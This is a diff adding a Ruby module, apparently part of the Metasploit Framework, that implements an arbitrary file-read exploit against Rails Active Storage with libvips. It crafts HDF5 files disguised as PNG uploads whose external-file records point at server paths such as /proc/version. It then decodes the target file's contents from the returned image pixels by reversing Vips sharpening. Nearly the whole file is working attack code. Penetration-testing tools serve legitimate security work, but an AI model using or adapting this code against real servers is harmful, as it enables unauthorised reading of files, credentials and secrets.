+++ lib/msf/core/exploit/remote/http/rails_active_storage_vips/file_reader.rb
@@ -1,0 +1,315 @@
+# frozen_string_literal: true
+
+require 'msf/core/exploit/remote/http/rails_active_storage_vips/png_decoder'
+
+module Msf::Exploit::Remote::HTTP::RailsActiveStorageVips
+  # Implements the bounded HDF5/Vips arbitrary file-read transport.
+  module FileReader
+    EXPLOIT_DATA_DIR = ['exploits', 'CVE-2026-66066'].freeze
+    EXTERNAL_PATH_PLACEHOLDER = '/rails_vips_external_path_placeholder_012345678901234567890123456789'.b.freeze
+    EXTERNAL_OFFSET_MARKER = 0x4d53460000000000
+    READ_LAYOUTS = [256, 100, 64, 32, 20, 16].map do |dimension|
+      data_columns = (dimension - 1) / 2
+      {
+        artifact: "ascii_#{dimension}.mat",
+        dimension: dimension,
+        data_columns: data_columns,
+        capacity: data_columns * dimension
+      }.freeze
+    end.freeze
+
+    private
+
+    def reset_read_budget!
+      @read_request_count = 0
+    end
+
+    def reserve_read_request!
+      @read_request_count ||= 0
+      if @read_request_count >= datastore['MaxReadRequests']
+        raise ReadBudgetError, "MaxReadRequests (#{datastore['MaxReadRequests']}) was exhausted; increase it only after assessing the target storage and request impact"
+      end
+
+      @read_request_count += 1
+    end
+
+    def patch_hdf5_template(layout, external_path, external_offset = 0)
+      raise FlowError, 'External read path must be absolute' unless external_path.to_s.start_with?('/')
+      raise FlowError, 'External read path contained a NUL byte' if external_path.to_s.include?("\x00")
+      raise FlowError, 'External read path was too long' if external_path.to_s.b.bytesize > EXTERNAL_PATH_PLACEHOLDER.bytesize
+      raise FlowError, 'External read offset must be non-negative' if external_offset.negative?
+      raise FlowError, 'External read offset was too large' if external_offset + layout[:capacity] > 0x7fffffffffffffff
+
+      paths = [Msf::Config.data_directory, Msf::Config.user_data_directory].map do |directory|
+        ::File.join(directory, *EXPLOIT_DATA_DIR, layout[:artifact])
+      end
+      path = paths.find { |candidate| ::File.file?(candidate) }
+      raise DataError, "Missing exploit data file: #{paths.join(' or ')}" unless path
+
+      # HDF5 external-file records are described in the HDF5 format specification:
+      # https://support.hdfgroup.org/documentation/hdf5/latest/_f_m_t3.html
+      data = ::File.binread(path)
+      unless data.scan(EXTERNAL_PATH_PLACEHOLDER).length == layout[:data_columns]
+        raise DataError, "Exploit data file #{layout[:artifact]} had an unexpected external path layout"
+      end
+
+      replacement = external_path.to_s.b.ljust(EXTERNAL_PATH_PLACEHOLDER.bytesize, "\x00")
+      data = data.gsub(EXTERNAL_PATH_PLACEHOLDER) { replacement }
+
+      layout[:data_columns].times do |index|
+        marker_record = [EXTERNAL_OFFSET_MARKER + index, layout[:dimension]].pack('Q<Q<')
+        position = data.index(marker_record)
+        unless position && data.index(marker_record, position + 1).nil?
+          raise DataError, "Exploit data file #{layout[:artifact]} did not contain marker #{index} exactly once"
+        end
+
+        data[position, 8] = [external_offset + (index * layout[:dimension])].pack('Q<')
+      end
+
+      data
+    end
+
+    def detect_read_context
+      candidates = READ_LAYOUTS.dup
+      errors = []
+
+      until candidates.empty?
+        layout = candidates.shift
+        begin
+          read = file_read_once(layout, '/proc/version', 0, "probe_#{layout[:dimension]}.png")
+          if read[:width] != layout[:dimension] || read[:height] != layout[:dimension]
+            observed_limit = [read[:width], read[:height]].min
+            candidates.select! { |candidate| candidate[:dimension] <= observed_limit } if observed_limit.positive?
+            errors << "#{layout[:dimension]}x#{layout[:dimension]} returned #{read[:width]}x#{read[:height]}"
+            next
+          end
+
+          %i[raw sharpened].each do |mode|
+            pixels = restore_ascii_pixels(read, layout, mode)
+            if pixels.include?('Linux version ')
+              print_good("Selected the #{layout[:dimension]}x#{layout[:dimension]} #{mode} text-read layout (#{layout[:capacity]} bytes per request)")
+              return { layout: layout, mode: mode, representation: read }
+            end
+          rescue TriggerError => e
+            errors << "#{layout[:dimension]}x#{layout[:dimension]} #{mode}: #{e.message}"
+          end
+        rescue FlowError, TriggerError => e
+          errors << "#{layout[:dimension]}x#{layout[:dimension]}: #{e.message}"
+        end
+      end
+
+      raise TriggerError, "Could not recover /proc/version through the selected representation (#{errors.join('; ')})"
+    end
+
+    def file_read_once(layout, external_path, external_offset, filename)
+      reserve_read_request!
+      signed_id = direct_upload(
+        csrf_token: csrf_token,
+        filename: filename,
+        content_type: 'image/png',
+        content: patch_hdf5_template(layout, external_path, external_offset)
+      )
+      representation_path, res = request_crafted_representation(signed_id, filename)
+      raise UnreachableError, 'No response while requesting the crafted representation' unless res
+      raise TriggerError, "Crafted representation returned HTTP #{res.code}" unless res.code == 200
+
+      PngDecoder.decode(res.body.to_s.b).merge(path: representation_path, signed_id: signed_id)
+    end
+
+    def request_crafted_representation(signed_id, filename)
+      if datastore['VARIATION_KEY'].present?
+        return request_variation_key_representation(signed_id, filename)
+      end
+
+      path = substitute_representation_blob(base_representation_path, signed_id, filename)
+      [path, request_representation(path)]
+    end
+
+    def request_variation_key_representation(signed_id, filename)
+      routes = @variation_key_route ? [@variation_key_route] : %i[redirect legacy]
+      statuses = {}
+
+      routes.each do |route|
+        path = standard_representation_path(signed_id, datastore['VARIATION_KEY'], filename, route: route)
+        res = request_representation(path)
+        if res&.code == 200 && res.body.to_s.b.start_with?(PngDecoder::PNG_SIGNATURE)
+          @variation_key_route = route
+          return [path, res]
+        end
+
+        statuses[route] = res&.code
+      end
+
+      if statuses.values.all?(&:nil?)
+        raise UnreachableError, 'No response from either standard Active Storage representation route'
+      end
+
+      details = statuses.map { |route, status| "#{route}: #{status ? "HTTP #{status}" : 'no response'}" }.join(', ')
+      raise TriggerError, "Crafted representation did not return a PNG image through a standard Active Storage route (#{details})"
+    end
+
+    def read_text_file(context, external_path, max_bytes:, filename:, stop_when: nil, allow_partial: false)
+      combined = String.new.b
+      offset = 0
+
+      while offset < max_bytes
+        read = file_read_once(context[:layout], external_path, offset, filename)
+        decoded = if allow_partial && context[:mode] == :sharpened
+                    restore_ascii_pixels_partial(read, context[:layout])
+                  else
+                    restore_ascii_pixels(read, context[:layout], context[:mode])
+                  end
+        combined << decoded.byteslice(0, max_bytes - combined.bytesize)
+        break if decoded.bytes.all?(&:zero?)
+        break if stop_when&.call(combined)
+
+        offset += context[:layout][:capacity]
+      end
+
+      combined.sub(/\x00+\z/n, '')
+    end
+
+    def try_read_text_file(context, external_path, max_bytes:, filename:, stop_when: nil, allow_partial: false)
+      read_text_file(context, external_path, max_bytes: max_bytes, filename: filename, stop_when: stop_when, allow_partial: allow_partial)
+    rescue FlowError, TriggerError => e
+      vprint_status("Skipping #{external_path}: #{e.message}")
+      nil
+    end
+
+    def restore_ascii_pixels(read, layout, mode)
+      validate_read_pixels!(read, layout)
+      dimension = layout[:dimension]
+      restored = String.new.b
+      (1...(dimension - 1)).step(2) do |x_coordinate|
+        observed = dimension.times.map do |y_coordinate|
+          read[:pixels].getbyte((y_coordinate * dimension) + x_coordinate)
+        end
+        column = mode == :raw ? observed : restore_ascii_column(observed)
+        restored << column.pack('C*')
+      end
+      restored
+    end
+
+    def restore_ascii_pixels_partial(read, layout)
+      validate_read_pixels!(read, layout)
+      dimension = layout[:dimension]
+      restored = String.new.b
+      (1...(dimension - 1)).step(2) do |x_coordinate|
+        observed = dimension.times.map do |y_coordinate|
+          read[:pixels].getbyte((y_coordinate * dimension) + x_coordinate)
+        end
+        column, consistent = restore_ascii_column_partial(observed)
+        restored << column.each_index.map { |index| consistent[index] ? column[index] : 0 }.pack('C*')
+      end
+      restored
+    end
+
+    def validate_read_pixels!(read, layout)
+      dimension = layout[:dimension]
+      unless read[:width] == dimension && read[:height] == dimension
+        raise TriggerError, "Expected a #{dimension}x#{dimension} representation, got #{read[:width]}x#{read[:height]}"
+      end
+      unless read[:pixels].to_s.b.bytesize == dimension * dimension
+        raise TriggerError, 'Representation pixel data had an unexpected length'
+      end
+    end
+
+    def restore_ascii_column(observed)
+      restored = Array.new(observed.length, 0)
+      index = 0
+
+      while index < observed.length
+        if observed[index].zero?
+          index += 1
+          next
+        end
+
+        finish = index
+        finish += 1 while finish < observed.length && !observed[finish].zero?
+        solved = solve_ascii_run(
+          observed[index...finish],
+          touches_top: index.zero?,
+          touches_bottom: finish == observed.length
+        )
+        solved.each_with_index { |value, offset| restored[index + offset] = value.round.clamp(0, 255) }
+        index = finish
+      end
+
+      unless sharpened_column(restored) == observed
+        raise TriggerError, 'Representation pixels did not match the expected Vips sharpening transform'
+      end
+
+      restored
+    end
+
+    def restore_ascii_column_partial(observed)
+      restored = Array.new(observed.length, 0)
+      index = 0
+      while index < observed.length
+        if observed[index].zero?
+          index += 1
+          next
+        end
+
+        finish = index
+        finish += 1 while finish < observed.length && !observed[finish].zero?
+        solved = solve_ascii_run(
+          observed[index...finish],
+          touches_top: index.zero?,
+          touches_bottom: finish == observed.length
+        )
+        solved.each_with_index { |value, offset| restored[index + offset] = value.round.clamp(0, 255) }
+        index = finish
+      end
+
+      rendered = sharpened_column(restored)
+      consistent = restored.each_index.map do |position|
+        expected_ascii_byte?(restored[position]) && ([position - 1, 0].max..[position + 1, restored.length - 1].min).all? do |neighbor|
+          rendered[neighbor] == observed[neighbor]
+        end
+      end
+      [restored, consistent]
+    end
+
+    def expected_ascii_byte?(value)
+      value.zero? || [9, 10, 13].include?(value) || value.between?(32, 126)
+    end
+
+    def solve_ascii_run(values, touches_top:, touches_bottom:)
+      raise TriggerError, 'Cannot solve an empty text run' if values.empty?
+
+      size = values.length
+      lower = Array.new(size, -1.0)
+      diagonal = Array.new(size, 32.0)
+      upper = Array.new(size, -1.0)
+      right_hand_side = values.map { |value| 24.0 * value }
+      lower[0] = 0.0
+      upper[-1] = 0.0
+      diagonal[0] = 31.0 if touches_top
+      diagonal[-1] = 31.0 if touches_bottom
+
+      (1...size).each do |index|
+        raise TriggerError, 'Sharpening equation contained a zero pivot' if diagonal[index - 1].zero?
+
+        factor = lower[index] / diagonal[index - 1]
+        diagonal[index] -= factor * upper[index - 1]
+        right_hand_side[index] -= factor * right_hand_side[index - 1]
+      end
+
+      solved = Array.new(size)
+      solved[-1] = right_hand_side[-1] / diagonal[-1]
+      (size - 2).downto(0) do |index|
+        solved[index] = (right_hand_side[index] - (upper[index] * solved[index + 1])) / diagonal[index]
+      end
+      solved
+    end
+
+    def sharpened_column(source)
+      source.each_index.map do |index|
+        previous = index.zero? ? source[index] : source[index - 1]
+        following = index == source.length - 1 ? source[index] : source[index + 1]
+        (((32 * source[index]) - previous - following) / 24.0).round.clamp(0, 255)
+      end
+    end
+  end
+end
